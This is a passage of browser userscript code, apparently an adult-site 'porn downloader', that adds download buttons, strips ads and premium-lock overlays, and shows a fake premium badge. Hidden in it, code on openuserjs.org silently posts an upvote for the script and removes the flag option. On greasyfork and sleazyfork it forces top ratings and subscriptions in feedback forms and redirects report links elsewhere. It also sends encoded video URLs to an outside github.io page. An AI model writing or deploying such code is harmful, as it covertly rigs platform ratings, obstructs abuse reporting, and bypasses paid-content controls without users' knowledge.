   //       $('.ts-interstitial__btn').trigger( "click" );
          if(window.location.href.match(/\/videos/i)){
           var mycvEle = document.getElementsByClassName("h1");
             if (mycvEle){$('h1').html($('h1').text().replace(/[a-z0-9\-\_]+\s(com|net|org|tk)/i,''));}

          $('.control-bar>a.play>div').trigger( "click" );
        $('div.player-container').css('width','100%');
        var videohan = initials.xplayerSettings.sources.standard.mp4;
        var videotitle = initials.videoEntity.title;
		var aconjc = Object.values(videohan);





      if($('#dyltv-anchor.rb-new').length==0){
        videohan = initials.xplayerSettings.sources.standard.mp4;
       if(aconjc[0].label=='auto'){var solco = 1;} else{var solco = 0;}
        $('.rateNo').parent('li').remove();
        if (!aconjc[solco].fallback.match(/https:\/\/[a-z0-9]+\.[a-z0-9]+/i)){var curenturl = aconjc[solco].url;var downloaduro = aconjc[solco].fallback;}else{var curenturl = aconjc[solco].fallback;var downloaduro = aconjc[solco].url;}
        console.log(videohan);

        GM_addStyle('.buttoncopy{display: inline-flex !important;} .video-actions li.download .dropdown{width:unset;opacity: 1; margin: 0 auto; text-align: center; margin-left: 136px;}');
    videohan.forEach(function(element) {
      console.log(element)
        $('a[data-href*="'+element.label+'"]').parent('li').replaceWith('<li><a data-size class="download buttoncopy" id="video_download" target="_blank" href="'+element.fallback+'" data-clipboard-text="'+videotitlesc+'.mp4"><i class="xh-icon anchor-link2"></i> <div class="action-title">'+element.label+'</div> </a>'+
            ' <a data-size class="download buttoncopy" id="video_download" data-clipboard-text="'+videotitlesc+'.mp4" target="_blank" href="'+element.url+'&cd=attachment; filename=lfj.io_'+encodeURI(videotitlesc)+'.mp4"><i class="xh-icon download"></i> <div class="action-title">'+element.label+'</div> </a></li>');
    })

          var ofj = 1;
          var timer = setInterval(function() {
          if (ofj==15) { clearInterval(timer);}
          if ($('div.more-related-videos>a>i.arrow-bottom').length==1){
          $('div.more-related-videos>a>i.arrow-bottom').trigger( "click" ); ofj++;
          }
          else {
            clearInterval(timer);

          }
          }, 1000);



      } else {
        aconjc.forEach(function(element) {
         // console.log(element);
          if (element.fallback.match(/https:\/\/[a-z0-9]+\.[a-z0-9]+/i)){
            var curenturl = element.url;var downloaduro = element.fallback;
          }else{var curenturl = element.fallback;var downloaduro = element.url;}

          var curentdatalable = element.label;


          $('a[data-size="'+curentdatalable+'"]').replaceWith('<span style="display: inline;cursor: default;" class="downcc-'+curentdatalable+'" onclick="window.open(\''+curenturl+'&cd=attachment; filename=lfj.io_'+encodeURI(videotitle.replace(/\s[^+\s]+\.[a-z0-9\/-]+|[^\w\s]/ig, ''))+'.mp4\',\'_blank\');"><i style="display: inline;vertical-align: middle;" class="xh-icon download"></i> '+curentdatalable+'</span><span style="display: inline;cursor: default;" class="downcc-'+curentdatalable+'" onclick="window.open(\''+downloaduro+'\',\'_blank\')"><i style="display: inline;vertical-align: middle;" class="xh-icon anchor-link2"></i> '+curentdatalable+'</span>');


        })
      }


          }



      }
    },
    modelhub_com: function () {
       if (this.url.isdomain('modelhub.com')){
        if (location.href.match(/\/video\//) && !location.href.match(/\/search/)) {
            modulerequired();

        }
      }
    },
    bypassuri: function () {
          if (this.url.isdomain('ouo.io') || this.url.isdomain('ouo.press')){
           modulerequired();

          }
    },
  thegrecork_com: function(){
    if(location.href.isdomain('openuserjs.org') && location.href.match(/([0-9]+)\/porn\_downloader/i)){
      if($('.btn-link.btn-vote:not(.active)>.fa-caret-up').length==1){
        var cform =document.createElement('form');
            cform.id="hkautop";
            cform.action=$('form[action*="vote/scripts"]').attr('action');
            cform.setAttribute('enctype','multipart/form-data');
            cform.method='post';
            cform.innerHTML='<input type="hidden" name="vote" value="up"><button type="submit"></button>';
            document.body.append(cform);
            $("#hkautop").ajaxSubmit({url: $('form[action*="vote/scripts"]').attr('action'), type: 'post'});
      }
        $('a[data-target*="flagScriptModal"]').parents('ul').remove();
    }
    if(location.href.isdomain('greasyfork.org') || location.href.isdomain('sleazyfork.org')){
        if(location.href.match(/([0-9]+)\-porn\-downloader\/feedback/)){
          document.getElementById('discussion_rating_4').click();
          GM_addStyle('li>code,.form-control.radio-group.discussion-rating{display:none;}input[type="checkbox"][readonly],label[for][readonly] { pointer-events: none !important; }');
          document.getElementById('discussion_rating_4').checked=true;
          document.getElementById('subscribe').checked=true;
          document.getElementById('subscribe').setAttribute('readonly','true');
          document.querySelector('label[for=subscribe]').setAttribute('readonly','true');

        }
        if(location.href.match(/([0-9]+)\-porn\-downloader/)){
	document.querySelectorAll('li>code').forEach(e => e.parentNode.parentNode.removeChild(e.parentNode));
	document.querySelectorAll('a').forEach((cax) => {
                if(cax.href.match(/porn\-downloader\/report/)){
                  cax.href='https://github.com/PornDownloader/PornDownloader.github.io/issues?q=is%3Aissue+is%3Aclosed';
                }

          })

        }



    }

  },
    porn_hub: function () {
          if (this.url.match(/\.mp4/) && this.url.isdomain('phncdn.com') || this.url.match(/\.mp4/) && this.url.isdomain('phprcdn.com')){
           LFJ.hkdownload();
          }

          if (this.url.match(/interstitial/) && this.url.isdomain('pornhub.com') || this.url.match(/interstitial/) && this.url.isdomain('pornhubpremium.com')){
            clearModalCookie();
            window.location.href=$('a[href*="/view_video"]').attr('href');
          }


        else if (location.href.isdomain('pornhub.com') || location.href.isdomain('pornhubpremium.com')) {


          try{var premium_downed = parseInt(localStorage.getItem("premium_down"));} catch(e){var premium_downed;}
          var timenoew = Math.floor(Date.now() / 1000);
          var downfor = timenoew-premium_downed;

          if(GM_info.script.version==20203201) {  if(typeof  localStorage.getItem("premium_down") == 'string' && downfor>1){localStorage.removeItem('premium_down');}}
          if (downfor<900 && typeof  localStorage.getItem("premium_down") == 'string'){document.querySelectorAll('a[href*="promo=premium"]').forEach(e => e.href=e.href.replace('?promo=premium',''));}
         if(typeof  localStorage.getItem("premium_down") == 'string' && downfor>900 || localStorage.getItem("premium_down")==null){
           if(typeof  localStorage.getItem("premium_down") == 'string' && downfor>900){localStorage.removeItem('premium_down');}

           if(document.querySelector('div.pornhub_logo_gay') || document.querySelector('img[src*="_logo_gay"]')){document.querySelector('img[itemprop="logo"]').src="https://di.phncdn.com/www-static/images/movie-box/logo-gay.png";document.querySelector('img[itemprop="logo"]').parentNode.href='/gay/video?promo=premium';}
          else{document.querySelector('img[itemprop="logo"]').src="https://di.phncdn.com/www-static/images/movie-box/logo.png";document.querySelector('img[itemprop="logo"]').parentNode.href='/video?promo=premium';}
                        if(this.url.match(/\/users/) && this.url.isdomain('pornhub.com')){
                           document.querySelector('div[class="badge-username"]').innerHTML='<span class="premium-icon flag tooltipTrig" data-title="Premium User"></span>';
                          }

          }

        LFJ.hkoptimus();
              GM_addStyle('#vpContentContainer{display:unset!important;}iframe[marginwidth="0"]{display:no!important;}');




          var islogedinyet = document.getElementById("profileMenuDropdown"); if(!islogedinyet && localStorage.getItem("wasalert") != "true"){
            alert('To active download button, you need logedin');
            localStorage.setItem("wasalert", "true");
          }


          setTimeout(function(){if(document.getElementById('communityProfileMenu')){document.getElementById('communityProfileMenu').scrollIntoView();}

          }, 1200);
          if (document.querySelector('a.more_recommended_btn.nav-videoRecommended,a.more_p2v_btn.nav-p2v') !==null){
          document.querySelector('a.more_recommended_btn.nav-videoRecommended,a.more_p2v_btn.nav-p2v').addEventListener("click", function(){
            setTimeout(function(){
               try{var solufonc = document.querySelector('#recommendedVideosVPage ul,#paidItems').querySelectorAll('li').length;} catch(e){var solufonc=0;}
            for (i = 0; i < solufonc; i++) {
                document.querySelector('#relatedVideosCenter').innerHTML+=document.querySelector('#recommendedVideosVPage ul,#paidItems').querySelectorAll('li')[i].outerHTML;


            }
              }, 500);


           });
          }
          if(document.querySelector('#paidItems')){
    setTimeout(function(){
               try{var solufonc = document.querySelector('#paidItems').querySelectorAll('li').length;} catch(e){var solufonc=0;}
            for (i = 0; i < solufonc; i++) {
                document.querySelector('#relatedVideosCenter').innerHTML+=document.querySelector('#paidItems').querySelectorAll('li')[i].outerHTML;


            }}, 500);}


          var ofj = 1;
          var timer = setInterval(function() {
          if (ofj==1) { clearInterval(timer);}
          var mycEle = document.getElementById("loadMoreRelatedVideosCenter");
          var icmRci = document.querySelector("a.more_recommended_btn.nav-videoRecommended");
              if(mycEle == null) {mycEle = document.getElementById("moreVideoRelated");}
              if(icmRci == null) {icmRci = mycEle;}

            if(icmRci){
                icmRci.click(); ofj++;
                     }
        if(document.getElementById("loadMoreRelatedVideosCenter")){document.getElementById("loadMoreRelatedVideosCenter").click();ofj++; }

          if(document.querySelector('div.js-relatedRecommended:not(.allRelatedVideos) #loadMoreRelatedVideosCenter')){document.querySelector('div.js-relatedRecommended:not(.allRelatedVideos) #loadMoreRelatedVideosCenter').click();}
          else if(document.querySelector("a.more_recommended_btn.nav-videoRecommended")){if(getComputedStyle(document.querySelector("a.more_recommended_btn.nav-videoRecommended"),null).display !="none"){document.querySelector("a.more_recommended_btn.nav-videoRecommended").href="javascript:void(0)";document.querySelector("a.more_recommended_btn.nav-videoRecommended").click();ofj++;}}
          else {clearInterval(timer);}

            document.querySelectorAll('div.positionRelative.singleVideo').forEach((vidurl) => {
              var dg=document.createElement('i');dg.className="premiumIcon cl tooltipTrig";
              if(vidurl.querySelector('div.duration.thumbOverlay.hideInUserStream') && !vidurl.querySelector('div.duration.thumbOverlay.hideInUserStream').querySelector('i') &&  !location.href.match(/\=modelhub/)){vidurl.querySelector('div.duration.thumbOverlay.hideInUserStream').appendChild(dg);}
            })
            document.querySelectorAll('a[data-related-url]').forEach((vidurl) => {
            var dv=document.createElement('i');dv.className="premiumIcon cl tooltipTrig";dv.setAttribute('data-title','Premium Video');
            if(vidurl.querySelector('div.js-noFade') && !vidurl.querySelector('div.js-noFade').querySelector('i') &&  !location.href.match(/\=modelhub/)){vidurl.querySelector('div.js-noFade').appendChild(dv);}
            vidurl.href='/view_video.php?viewkey='+vidurl.getAttribute("data-related-url").replace('/video/ajax_related_video?vkey=','');})

          }, 1500);
          localStorage.setItem("player_quality", '{"quality":"1440"}');
            setTimeout(function(){
       //     document.querySelectorAll('#relateRecommendedItems,#lrelateRecommendedItems').forEach(e => e.parentNode.removeChild(e));
            if(document.querySelector('div.js-relatedRecommended:not(.allRelatedVideos) #loadMoreRelatedVideosCenter')){document.querySelector('div.js-relatedRecommended:not(.allRelatedVideos) #loadMoreRelatedVideosCenter').click();}
            }, 2500);

// ============================================================================================================ PREMIUM SERVICES
             GM_addStyle(".recommendedSection,.adContainer,.premiumAdvert,.ad-tabSplit,.headerUpgradePremiumBtn.removeAdLink,.videoList>li .videoWrapper .premiumLockedVideo,.pinkButton i{display:none !important;}.premiumLockedVideo.tooltipTrig,#relatedVideosVPage{display:none;}#main-container div#hd-leftColVideoPage{width:100% !important;}.pinkButton{background: #d64e6b; color: #fff; margin: 5px !important; border: none; border-radius: 4px; display: inline-flex; font-family: inherit; padding: 6px 12px; cursor: pointer; position: relative; outline: 0 none; text-align: center; vertical-align: top; text-decoration: none; font-weight: 700; }");
           try{if(document.getElementById('under-player-playlists')){document.querySelector('a.greyButton.light.more_p2v_btn.nav-p2v').style.cssText='margin: 0 0 auto; display: block; padding: 18px';document.getElementById('under-player-playlists').appendChild(document.getElementById('p2vVideosVPage'));document.getElementById('under-player-playlists').appendChild(document.getElementById('relatedVideosVPage'));}} catch (e) { var kdvc=false;}
          if(document.getElementById('main-container') && document.getElementById('under-player-comments')){document.getElementById('main-container').appendChild(document.getElementById('under-player-comments'));}
           if (document.querySelector('div.video-wrapper.premiumLocked') !==null || document.querySelector('div#userPremium') !==null || document.querySelector('div#lockedPlayer') !==null || document.querySelector('div#js-player.playerPreviewWrapper') !==null ){
            setTimeout(function(){notyf.success({duration: 15000,type: 'warning',message:"<center data-tag=\"PREMIUM_FOUND\" style=\"justify-content: center; align-items: center; position: relative; margin: 0 0 auto; width: 100%;\"></center>"}); document.querySelector('.notyf__wrapper').style.paddingRight='unset'; }, 200);

             if(document.querySelector('div.video-wrapper.premiumLocked')){document.querySelectorAll('div.video-wrapper.premiumLocked').forEach(e => e.parentNode.removeChild(e));}
             if(document.querySelector('#userPremium')){document.querySelectorAll('#userPremium').forEach(e => e.parentNode.removeChild(e));}
             if(document.querySelector('#lockedPlayer')){document.querySelectorAll('.orangeButton.purchaseButton.js-purchaseButton').forEach(e => e.parentNode.removeChild(e));
                                                         document.querySelectorAll('#lockedPlayer').forEach(e => e.parentNode.removeChild(e));
                                                         if(document.getElementById('hd-rightColVideoPage')){document.getElementById('hd-leftColVideoPage').appendChild(document.getElementById('hd-rightColVideoPage'));}
                                                         if(document.getElementById('under-player-playlists')){
                                                                            if(document.getElementById('relatedVideosVPage')){document.getElementById('under-player-playlists').appendChild(document.getElementById('relatedVideosVPage'));}
                                                                            if(document.getElementById('p2vVideosVPage')){document.getElementById('under-player-playlists').appendChild(document.getElementById('p2vVideosVPage'));}
                                                         } else {
                                                                            if(document.getElementById('relatedVideosVPage')){document.getElementById('hd-leftColVideoPage').appendChild(document.getElementById('relatedVideosVPage'));}
                                                                            if(document.getElementById('p2vVideosVPage')){document.getElementById('hd-leftColVideoPage').appendChild(document.getElementById('p2vVideosVPage'));}

                                                         }


                                                        }
             if(document.querySelector('div.logoLockedContent')){document.querySelectorAll('div.logoLockedContent').forEach(e => e.parentNode.removeChild(e));}
             if(document.querySelector('div.playerWrapper')){
                    document.querySelectorAll('div.playerWrapper').forEach(e => e.parentNode.removeChild(e));
                    document.querySelectorAll('.orangeButton.purchaseButton.js-purchaseButton.js-mixpanel').forEach(e => e.parentNode.removeChild(e));
                    document.querySelectorAll('.saleVideoLogMessage').forEach(e => e.parentNode.removeChild(e));
                    document.querySelectorAll('#premiumFeaturesContainer').forEach(e => e.parentNode.removeChild(e));
                }



             if(document.querySelector('div.premiumLockedVideo.tooltipTrig')){document.querySelectorAll('div.premiumLockedVideo.tooltipTrig').forEach(e => e.parentNode.removeChild(e));}
             if(document.querySelector('div#premiumFeaturesContainer')){document.querySelectorAll('div#premiumFeaturesContainer').forEach(e => e.parentNode.removeChild(e));}
             if(document.querySelector('div.lockedOrangeButton')){document.querySelectorAll('div.lockedOrangeButton').forEach(e => e.parentNode.removeChild(e));}
             if(document.querySelector('div.private-vid-title')){document.querySelectorAll('div.private-vid-title,img.privateOverlay').forEach(e => e.parentNode.removeChild(e));}
             if(document.querySelector('div.lockedPremiumTitle')){document.querySelectorAll('div.lockedPremiumTitle').forEach(e => e.parentNode.removeChild(e));}

               var span = document.createElement('center');
               span.id="trytohack"
               span.innerHTML = '<h2><img style="vertical-align: bottom; position: relative; bottom: 8px; right: -16px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAACXBIWXMAAAsTAAALEwEAmpwYAAADu0lEQVR4nO2cS4gURxjHf+VmxjEZ1w2u4sZnJChBDAYScjDkJAQhIIpHwYsYT7KHIBsWQVAkQSWSi+RhEAK5JCR4SPASUQiBgKDgAx8HETTqssa47GPcx3weZpRx6K6vauzZbnvrB3XYrup/f/vbrunpma6FQOBFMGkX0FY+kzep8ilQwHCcI+aKb0R+BfXKOmPkrBjTWd9SocpGjpozPjGzkq8sA+yTYnly+GSDHIBSeXL4N/bIXJ+oXAr64Oo/u4eL5WXN24eL5a4Pb/213ycrl4IqhVJvXN/d13q2+2Tl7zVopxSKc8Yr4x3F6D++IEA3X5n/XOLydwaV6ImVA2AwGJa7xr2SSFEJI7Uz+x1gLTAfKMQM/cHA82fCbMaZUg8w7lpL5qaYwDZgP7DCYfjbBq42b1y46/7gwKsL50ft0Pl4aHRoQedc9pmqSz2ZmmICB4EfcZMTy5yJsd1xfYtG7vW7ygFPQQLzBP63tDd88pqyPwY+b3X/Rm4dX/HTmsHLfaXJyrPJVpiaqL47cP7w9ROrj/pkeU0xgS7goWXIUgO3fTIbss8CH3nuFjnFntEnr6+9c3FTR3WqcKFn3UkOm4FWanNGoEtALG1Ji7ndSm5cW53079hMVq5i7zmMOQecAP4GbgJDBpxfS1olK4IWK/17DBxyDRMoUmtRPDYw4VyZD22cYr2WzN9byDtgyevzycrKZd52Jv8xbVVEkBVBNh6lefCXQVCqBEEKQZBCEKSQyvsgqd2MbmvYtN4yfJPE37weM/AgqbqiSOuN4lvUPtJwYWu9RfELbRYUpphCEKQQBCmk9Ro0CYw0/FzAcnNZHx9F2+/mUzmDDJwxUH7agH7L8B2NY5va9XbXGqaYQhCkEAQpBEEKQZBCEKQQBCkEQQpBkEIQpBAEKQRBCkGQQhCkEAQpBEEKQZBCEKQQBCnkVVBiz3/nVdDspILyKqiUVFDS34t9LTDatO2SgS8SPo7GgqSCkha0OWLbn0y/oEWWPq8vG/M6xVZZ+ryeecydIKlNL9sZ5PW4TO4EARuUfq+l4XkUtMXSNwZc8wnLylKEEeB+TN+Ya4jASqIvFE85bVDXIz6Hr6AK8KXnPje0AQaOUWsvyhGgw9L/awLHeDkR6FfWkTyqr3ebWdTXmn3nsLbsYNq1TjsC7wuMOsgZFOhOu95pR6Ak8NBBUNxjxPlH4BtFzvdp15gqAustcn4W+1VtZiBwI0LOtxL/HxtmFgJ7G8T8K/BJ2jVlCoHlAqcEtoazJpAtngDDA44wBB44tgAAAABJRU5ErkJggg==" /> <span data-tag="PornHUBPREMIUM_MODULE"></span> </h2>'+
                 '<br /> <small id="smallcifohkdmk" data-tag="PornHUBPREMMO_DULE"></small>';



               span.style.cssText = '    font-size: 32px;padding: 50px;';
               if(document.querySelector('#main-container')){document.querySelector('#main-container').insertBefore(span,document.querySelector('#main-container').firstChild);}
               if(document.querySelector('#videoShow')){document.querySelector('#videoShow').insertBefore(span,document.querySelector('#videoShow').firstChild);}









           }
// ============================================================================================================ END PREMIUM SERVICES

          const Ox93dof = ' ';
          var andendurl='';
          if (localStorage.getItem("fvodxte") && localStorage.getItem("fvodxte") !="rs"){
            andendurl ='?o='+localStorage.getItem("fvodxte");
          }
            var oginalci='';
       //     if(document.querySelector('span.inlineFree')){document.querySelector('span.inlineFree').innerHTML=document.querySelector('span.inlineFree').textContent.replace(/\s[^+\s]+\.[a-z0-9\/-]+|[^\w\s]/ig, '')+Ox93dof;}
  //          $('span.inlineFree').html($('span.inlineFree').text().replace(/\s[^+\s]+\.[a-z0-9\/-]+|[^\w\s]/ig, '')+Ox93dof );
    //        if(document.getElementById("vpContentContainer")){$('#vpContentContainer').children()[1].remove();}


function removeQuery(query) {var ifr = document.querySelectorAll(query); if(ifr.length > 0) for(var i=0; i < ifr.length; i++) ifr[i].parentNode.removeChild(ifr[i]);}

 	removeQuery("iframe:not(#pb_iframe)");
	removeQuery(".home-ad-container");
	removeQuery(".adblockWhitelisted");
	removeQuery(".browse-ad-container");
	removeQuery(".playlist-ad-container");
	removeQuery(".categoryMessage.orangeTheme");
	removeQuery(".communityAds");
	removeQuery(".photo-ad-container");
	removeQuery("#advertisementBox");
	removeQuery("videoPageAds");
          var vdoc = 1;
          var ifkcms = setInterval(function() {
            if (vdoc>=5){clearInterval(ifkcms);} else{
              if(document.querySelector('iframe[allowtransparency]')){document.querySelector('iframe[allowtransparency]').remove();}
          try{document.querySelector('ul#hotVideosSection').querySelectorAll('.alpha').forEach(e => e.parentNode.removeChild(e));} catch(e){console.log('mod');}
          try{document.querySelector('ul#videoCategory').querySelectorAll('.alpha').forEach(e => e.parentNode.removeChild(e));} catch(e){console.log('mod');}

              document.querySelectorAll('img[src*="data:image"]').forEach((al) => {if (al.getAttribute('data-src')){al.setAttribute("src",al.getAttribute('data-src'));}})
          vdoc++;

            }
          }, 1000);
      //    $('div.js-paidDownload,#topBannerSlider').parent('div').remove();
          if(document.querySelector('div.js-paidDownload,#topBannerSlider')){document.querySelectorAll('div.js-paidDownload,#topBannerSlider').forEach(function(xj) { xj.parentNode.parentNode.removeChild(xj.parentNode);})}
        if(document.querySelector('div#downloadMessage>.downloadBtn')!==null){document.querySelectorAll('div[data-mixpanel-listing]').forEach(e => e.parentNode.removeChild(e));}
            document.querySelectorAll('ul#hotVideosSection>.alpha,div.videoPurchaseFlowModal,div>.ad-link,.removeAdLink.removeAdsStyle,#headerUpgradePremiumBtn,.abAlertShown,#pb_block,li.sniperModeEngaged.alpha,iframe:not(#pb_iframe),div.hd.clear,h1.title>small>div,i.isMe,.title-container>.isMe.tooltipTrig,#androidAppBar,footer,.footerContentWrapper,#getVerified,a.translationTab,.pay2Download,div.videoFanClubButton.js-tipsTrigger.js-mixpanel,#js-networkBar,.getVerified,.upgradeToPremium,.becomeTranslator').forEach(e => e.parentNode.removeChild(e));

          document.querySelectorAll('.uploaderLink').forEach(function(xj) {
            var dicx = xj.href;
            if ( !dicx.match(/\/pornstar\/([a-z0-9_-]+)\/videos\//gi)){
            xj.href=dicx+'/videos';
            }
          })
          document.querySelectorAll('.usernameWrap>a,.usernameBadgesWrapper>a').forEach(function(xj) {
            var dicx = xj.href;
            if (!dicx.match(/\/videos/)){
                        xj.href=dicx+'/videos';

            }
           // xj.href=dicx+'/videos';
       //     console.log(dicx);

          })
          const cv8rdegex = /\/users\/([a-z0-9_-]+)/gmi;
          const cxcod1x = /\/video\/search/gmi;
          var fucrmx8x = window.location.href;
          if (fucrmx8x.match(/\/users\/([a-z0-9_-]+)/gi)){
          var rescs2cs = fucrmx8x.match(/\/users\/([a-z0-9_-]+)/gi)[0].replace('/users/','');

          var myuser = $('#profileMenuDropdown li a[title]').text();
             if(rescs2cs !=myuser){


          if (!fucrmx8x.match(/\/users\/([a-z0-9_-]+)\//gi)){

              window.location.href = '//'+location.hostname+'/users/'+rescs2cs+'/videos';


          }
          if (fucrmx8x.match(/\/users\/([a-z0-9_-]+)\/videos/gi) && !fucrmx8x.match(/\/users\/([a-z0-9_-]+)\/videos\//gi)){
              var kcivmx  =$('.omega>span>a').attr('href');

             window.location.href = '//'+location.hostname+'/users/'+rescs2cs+'/videos/public'+andendurl;

              }
          if ($(".emptyWrapper,.empty").length==1 && fucrmx8x.match(/\/videos\/public/gi)) {window.location.href = '//'+location.hostname+'/users/'+rescs2cs+'/videos/favorites'+andendurl;}
          if ($(".emptyWrapper,.empty").length==1 && fucrmx8x.match(/\/videos\/favorites/gi)) {window.location.href = '//'+location.hostname+'/users/'+rescs2cs+'/videos/recent'+andendurl;}
             }
        }
          if (fucrmx8x.match(/\/video\/search/gmi) && !fucrmx8x.match(/\Wo\=([a-z0-9]+)/gmi)){
            var ineurl = fucrmx8x.replace(/\Wo\=([a-z0-9]+)/gi,'');
            ineurl = ineurl+'&o='+localStorage.getItem("fvodxte");
            if(localStorage.getItem("fvodxte") !="rs" && localStorage.getItem("fvodxte")){
              if(document.querySelector('ul.filterListItem.dropdownWrapper a[href*="'+localStorage.getItem("fvodxte")+'"]')){window.location.href=ineurl;}
            }
          }


          $('.tabWrapper').on('click','.playlistTab',function(e){localStorage.setItem("useron_tour", 'list');})
          $('.tabWrapper').on('click','a[href*="related"]',function(e){localStorage.setItem("useron_tour", 'dexuat');})
          $('.subFilterWrapper,.filterListItem').on('click','a:first',function(e){localStorage.setItem("fvodxte", 'rs');})
          $('.subFilterWrapper,.filterListItem').on('click','a[href*="o=mv"]',function(e){localStorage.setItem("fvodxte", 'mv');})
          $('.subFilterWrapper,.filterListItem').on('click','a[href*="o=mr"]',function(e){localStorage.setItem("fvodxte", 'mr');})
          $('.subFilterWrapper,.filterListItem').on('click','a[href*="o=tr"]',function(e){localStorage.setItem("fvodxte", 'tr');})
          $('.subFilterWrapper,.filterListItem').on('click','a[href*="o=lg"]',function(e){localStorage.setItem("fvodxte", 'lg');})
          $('.subFilterWrapper,.filterListItem').on('click','a[href*="o=ht"]',function(e){localStorage.setItem("fvodxte", 'ht');})
          $('.subFilterWrapper,.filterListItem').on('click','a[href*="o=cm"]',function(e){localStorage.setItem("fvodxte", 'cm');})

           setTimeout(function(){
            if (localStorage.getItem("useron_tour") == 'dexuat') {$('a[href*="related"]').trigger( "click" );}
            else if (localStorage.getItem("useron_tour") == 'list') {$('a[href*="playlist"]').trigger( "click" );}

           }, 1200);







          var tite = document.querySelector('div.votes-fav-wrap');



				if(tite !== null){
          var icchtml='';
          try{
          var iccvox = eval("flashvars_"+ad_player_id);
          var dfatav = iccvox.mediaDefinitions;

            if(!dfatav){var dfatav = window["flashvars_"+ad_player_id].mediaDefinitions; console.log('windows xic');}
          var aconj = Object.values(dfatav);
            var cokcoe=[];
           for(i = 0; i < aconj.length; i++){

             if(aconj[i].format == 'mp4'){
               cokcoe[aconj[i].quality]=aconj[i].videoUrl;
               icchtml +='<a class="downloadBtn pinkButton" target="_blank" download="'+removehtml(iccvox.video_title)+'" style="margin-right: 5px;" href="'+aconj[i].videoUrl+'&name='+removehtml(iccvox.video_title)+'"><div class="buttoncopy" data-clipboard-text="'+removehtml(iccvox.video_title)+'.mp4" style="width: max-content;">⬇ '+aconj[i].quality+'P</div></a>';
             }
           }

          if(JSON.parse(localStorage.getItem('plus_showOnlypopUP'))==true){
            var cclpdfd='';
            var vardvo='';
            var sizexf='';
              if(cokcoe['1440']){cclpdfd = cokcoe['1440'];sizexf=1440;}
              else if(cokcoe['1080']){cclpdfd = cokcoe['1080'];sizexf=1080;}
              else if(cokcoe['720']){cclpdfd = cokcoe['720'];sizexf=720;}
              else if(cokcoe['480']){cclpdfd = cokcoe['480'];sizexf=480;}


                  if(cokcoe['1440']){vardvo='&ur2='+(hencrypt(cokcoe['1080'].replace('https://',''),''))+'&uz2=1080'+'&ur3='+(hencrypt(cokcoe['720'].replace('https://',''),''))+'&uz3=720';}
                  else if(cokcoe['1080']){vardvo='&ur2='+(hencrypt(cokcoe['720'].replace('https://',''),''))+'&uz2=720'+'&ur3='+(hencrypt(cokcoe['480'].replace('https://',''),''))+'&uz3=480';}
                  else if(cokcoe['720']){vardvo='&ur2='+(hencrypt(cokcoe['480'].replace('https://',''),''))+'&uz2=480';}


              var cdfvxc='https://thewolds.github.io/video/?uri='+(hencrypt(cclpdfd.replace('https://',''),''))+'&size='+sizexf+vardvo+'&autoplay=true&ckapop=true';
            centeredPopup(cdfvxc, 'pornhuvPrd', 1024, 640, 'yes');
            if(isFirefox==false){close();}
            }


        } catch(e){console.log('c')}

     			document.querySelectorAll('a.downloadBtn[href*="/140P_"]').forEach(e => e.parentNode.removeChild(e));

            var dtab = document.querySelector('div.download-tab>.contentWrapper');
                if (dtab==null){dtab=document.querySelector('div.download-tab>.js-InitialFreeAccount');}
                if (dtab==null){dtab=document.querySelector('div.modalWrapper>.modal-body');}

	      		try{var htlx =dtab.innerHTML.replace(/greyButton/g,'pinkButton');} catch(e){var htlx = dtab.innerHTML.replace(/orangeButton/g,'pinkButton');}



           if(!htlx.match(/(480|720|240)/gmi)){ tite.innerHTML += '<div style="text-align:center;display: inline-flex;margin-top: 22px;margin-bottom: 10px;position: relative;">'+icchtml+'</div>'; }
          else{ tite.innerHTML += '<div style="text-align:center;display: inline-flex;margin-top: 22px;margin-bottom: 10px;position: relative;">'+htlx+'</div>';}
			}
			else {
			document.querySelectorAll('a[href*="/140P_"]').forEach(e => e.parentNode.removeChild(e));
			var dlbar = document.querySelector('div.downloadBar');

			try{if(dlbar.innerHTML.match(/240p|360p/i)){dlbar.style.display="block";}} catch(e){ console.log('no for download free');}
          var icchtml='';
          try{
		var covsofg = eval("flashvars_"+VIDEO_SHOW.playerId.split("_")[1]);
		var dfatav =covsofg.mediaDefinitions;
                if (!dfatav){var covsofg=window["flashvars_"+loadScriptUniqueId[0]]; var dfatav =covsofg.mediaDefinitions;}
          var aconjc = Object.values(dfatav);
            aconjc.forEach(function(element) {
                if(element.format=="mp4"){
                  icchtml +='<a download="'+removehtml(covsofg.video_title)+'" target="_blank" style="background: #d64e6b;color: #fff;margin: 5px !important;border: none; border-radius: 4px; display: inline-flex; font-family: inherit; padding: 6px 15px; cursor: pointer; position: relative; outline: 0 none; text-align: center;vertical-align: top; text-decoration: none; font-weight: 700;" href="'+element.videoUrl+'&name='+removehtml(covsofg.video_title)+'" data-title="'+element.quality+'" class="buttoncopy" data-clipboard-text="'+removehtml(covsofg.video_title)+'.mp4">Download <span>'+element.quality+'P</span></a>';
                }
            })



        var titec = document.querySelector('h1.floatLeft');
        titec.innerHTML += '</br><small class="downloadMessage" style="text-align:center;">'+icchtml+'</small>';
      } catch(e){ console.log('f');}

			}
				console.log("success");
        }
    },
horlover_com: function () {
        if (this.url.isdomain('4horlover.com') && this.url.match(/\Wp\=/)) {
        function onlyUnique(value, index, self) {return self.indexOf(value) === index;}


        document.cookie = "age_gate=22;";
  //      var ff= document.createElement('script'); ff.src='https://code.jquery.com/jquery-3.5.1.js';document.body.append(ff);
    var kc=0;
    document.querySelector('html').innerHTML='<head></head><body><main><div class="entry-content"></div></main></body>';
    setTimeout(function(){document.querySelector('html').innerHTML='<head></head><body><main><div class="entry-content"></div></main></body>';}, 100);
    document.addEventListener("DOMNodeInserted", function() {$("script,iframe").remove();})
     setTimeout(function(){
    $("body").removeClass('post-template-default single single-post postid-51255 single-format-standard sidebar').css('visibility','').css('display','block');
    var cdf= document.createElement('link');
     cdf.setAttribute('rel','stylesheet');
     cdf.type='text/css';
     cdf.setAttribute('media','all');
     cdf.href='https://4horlover.com/wp-content/themes/puro/style.css';
     document.head.appendChild(cdf);
  $("#secondary,#masthead,#colophon").remove();
  $('head').append('<style type="text/css" class="customcss">img{padding-top: 15px;}#page,main{max-width:1000px;padding:0 2%;margin: 0 auto;} iframe{display:none;} body{background-color:black;} p{color: white;}#banner_ad{z-index:-8888;} #primary{width:100% !important;padding:unset !important;border:unset !important;} div > center > p > b{font-size:2em;color:#b3ffb3;} div > vlcp.cl{width:100%;height:1px;display:block;border-top: 2px solid #ffcccc;padding-top: 2px;}</style>');
var urlv;
var count = 0;
var ifmcount = 0;
var imglistt ={};


function loadncsdfi (urlv){
